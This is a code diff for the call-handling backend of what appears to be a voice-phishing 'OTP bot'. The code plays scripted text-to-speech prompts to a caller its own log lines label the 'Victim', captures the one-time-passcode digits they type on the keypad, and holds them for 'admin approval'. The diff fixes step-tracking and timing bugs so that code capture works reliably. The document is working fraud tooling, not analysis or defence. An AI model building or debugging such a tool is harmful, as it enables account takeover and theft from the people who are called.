@@ -524,34 +524,41 @@ async def handle_say_finished(session_id: str, session: dict, call_id: str):
 
 async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: str):
     """Handle DTMF input based on current step"""
+    # Always get fresh session from database to ensure we have current step
+    fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    if fresh_session:
+        session = fresh_session
+        active_sessions[session_id] = session
+    
     current_step = session.get("current_step", 1)
+    status = session.get("status", "step1")
     otp_digits = session.get("otp_digits", 6)
     
-    logger.info(f"DTMF received: {dtmf_value}, current_step: {current_step}")
+    logger.info(f"handle_dtmf: dtmf={dtmf_value}, current_step={current_step}, status={status}")
     
-    if current_step == 1:
+    if current_step == 1 and status in ["step1", "calling"]:
         # Step 1: User pressed 1 or 0
-        await emit_log(session_id, "warning", f"⚠️ Victim Pressed {dtmf_value} Send OTP Now!")
+        first_digit = dtmf_value[0] if dtmf_value else ""
+        await emit_log(session_id, "warning", f"⚠️ Victim Pressed {first_digit} - Send OTP Now!")
         
         # Update to step 2
         await db.otp_sessions.update_one(
             {"id": session_id},
-            {"$set": {"first_input": dtmf_value, "current_step": 2, "status": "step2", "otp_digits_collected": ""}}
+            {"$set": {"first_input": first_digit, "current_step": 2, "status": "step2", "otp_digits_collected": ""}}
         )
         active_sessions[session_id]["current_step"] = 2
         active_sessions[session_id]["status"] = "step2"
+        active_sessions[session_id]["first_input"] = first_digit
         active_sessions[session_id]["otp_digits_collected"] = ""
         
         # Play Step 2 - OTP request
         await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP Request...")
         step2_text = session["messages"]["step2"]
-        await play_tts(call_id, step2_text, session.get("language", "en"))
+        result = await play_tts(call_id, step2_text, session.get("language", "en"))
+        logger.info(f"Step 2 TTS result: {result}")
+        # DTMF capture will be started after SAY_FINISHED event
         
-        # Wait for TTS then capture OTP
-        await asyncio.sleep(6)
-        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
-        
-    elif current_step == 2:
+    elif current_step == 2 and status == "step2":
         # Step 2: Collecting OTP digits
         otp_code = dtmf_value.replace("#", "").replace("*", "")
         
@@ -575,6 +582,9 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         await play_tts(call_id, step3_text, session.get("language", "en"))
         
         await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
+        
+    else:
+        logger.warning(f"Unexpected DTMF: dtmf={dtmf_value}, step={current_step}, status={status}")
 
 @otp_router.post("/accept/{session_id}")
 async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
